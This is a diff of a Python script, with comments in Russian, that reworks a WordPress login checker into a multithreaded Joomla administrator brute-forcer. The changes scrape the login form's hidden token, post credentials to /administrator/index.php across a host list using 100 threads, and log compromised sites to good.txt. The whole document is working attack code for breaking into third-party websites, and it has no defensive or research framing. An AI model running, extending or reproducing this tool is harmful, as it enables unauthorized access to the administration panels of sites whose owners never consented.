@@ -1,5 +1,4 @@
 # coding=utf-8
-
 import requests
 import time
 import os
@@ -16,20 +15,31 @@ headers = {
     'DNT': '1'
 }
 
-source_file = "good_joo1.txt"
+source_file = "source.txt"
 #theard_count = int(input('Number of threads: '))
-theard_count = 1 
+theard_count = 100
 def brut(string):
     t = string.split()
     url = 'http://'+t[2]+'/administrator/index.php'
     s = requests.Session()
     try:    
-        response = s.get(url, headers=headers, timeout = 10)
+        response = s.get(url, headers=headers, timeout = 30)
     except Exception:
-        print('ERROR')
+        print('ERROR while GET')
         return False
     try:
-        retur = re.findall('return', response.text, re.DOTALL)
+        parsed = lxml.html.fromstring(response.text)
+        links = parsed.xpath("//input[@value]")
+        list = []
+        for i in links:
+            #print(i.attrib['value'])
+            list.append(i.attrib['value'])
+        for i in links:
+            #print(i.attrib['name'])
+            cod = (i.attrib['name'])
+        retur = list[2]
+        #print(cod)
+        #print(retur)
     except:
         print('Error parsing url')
     payload = {
@@ -38,21 +48,20 @@ def brut(string):
         'option': 'com_login',
         'task': 'login',
         'return':retur, 
-        '123': '1'
+        cod: '1'
     }
     try:    
-        s.post(url, data=payload, headers=headers, timeout = 10)
+        s.post(url, data=payload, headers=headers, timeout = 30)
     except Exception:
-        print('ERROR')
+        print('ERROR while POST')
         return False
 #---------------------------------------------------------------------------------------
     '''if s.text.find('action=lostpassword')>0:action=logout
         return False
     else:'''
-    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
+    response = s.get('http://'+t[2]+'/administrator/index.php', headers=headers, timeout = 10)
     #if response.status_code == 200:
-    if response.text.find('action=logout')>0 and response.text.find('profile.php')>0:
-    #if response.text.find('action=lostpassword')<0:
+    if response.text.find('task=logout')>0:
         return True
     #else:
         #return False
@@ -65,7 +74,7 @@ def run(queue, result_queue):
     while not queue.empty():
         # получаем первую задачу из очереди
         host = queue.get_nowait()
-        print('Checking in thread {}'.format(current_thread()))
+        #print('Checking in thread {}'.format(current_thread()))
         print(host)
 	# проверяем URL
         try:
@@ -78,11 +87,11 @@ def run(queue, result_queue):
         queue.task_done()
         if status:
             print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
-            open('good.txt', 'a+').write(host + '\n')
+            open('good.txt', 'a+').write('Joomla: '+host + '\n')
         else:
             pass
-        print('Finished in thread {}. Result={}'.format(current_thread(), status))
-    print('{} closing'.format(current_thread()))
+        #print('\r Finished in thread {}. Result={}'.format(current_thread(), status))
+    #print('\r {} closing'.format(current_thread()))
 
 # MAIN
 def main():
